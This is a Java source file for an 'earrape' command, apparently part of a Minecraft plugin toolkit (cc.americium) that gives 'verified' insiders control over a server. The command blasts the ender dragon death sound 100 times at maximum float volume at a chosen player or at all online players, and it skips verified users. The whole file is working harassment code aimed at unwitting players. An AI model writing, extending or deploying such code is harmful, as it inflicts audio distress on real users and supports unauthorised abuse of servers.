package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.entity.Player;

import java.io.IOException;

public class Earrape implements Command {
    private final String[] soundFallbacks = {"ENTITY_ENDERDRAGON_DEATH", "ENDERDRAGON_DEATH", "ENTITY_ENDER_DRAGON_DEATH", "ENDER_DRAGON_DEATH"};

    @Override
    public String[] getCommands() {
        return new String[]{"earrape"};
    }

    @Override
    public String getDescription() {
        return "Players the ender dragon sound 100 times for a player at the highest volume possible. (Newer versions cap this volume)";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        // https://www.spigotmc.org/wiki/cc-sounds-list/
        // There are different sound formats on versions below 1.9.
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "earrape <player | *>");
            return;
        }

        Player found = Bukkit.getPlayer(args[0]);
        boolean allPlayers = false;

        if (found == null) {
            if (args[0].equals("*")) {
                allPlayers = true;
            } else {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
                return;
            }
        }

        boolean finalAllPlayers = allPlayers;
        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            Sound sound;
            try {
                sound = this.getSound();
                if (sound == null) {
                    sender.sendMessage(Colors.Prefix + Colors.Failure + "Could not find a fallback sound!");
                    return;
                }
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                return;
            }

            if (finalAllPlayers) {
                for (Player p : Bukkit.getOnlinePlayers()) {
                    try {
                        if (context.getZ_().getAuth().isVerified(p.getName())) {
                            // Save their ears!
                            continue;
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    try {
                        for (int i = 0; i < 100; i++) {
                            p.playSound(p.getLocation(), sound, Float.MAX_VALUE, 1);
                        }
                    } catch (Exception e) {
                        sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                    }
                }

                sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully attempted to earrape all players!");
                return;
            }

            try {
                for (int i = 0; i < 100; i++) {
                    found.playSound(found.getLocation(), sound, Float.MAX_VALUE, 1);
                }

                sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully attempted to earrape " + found.getName() + "!");
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            }
        });
    }

    private Sound getSound() {
        for (String s : this.soundFallbacks) {
            try {
                return Sound.valueOf(s);
            } catch (Exception ignored) {

            }
        }

        return null;
    }
}
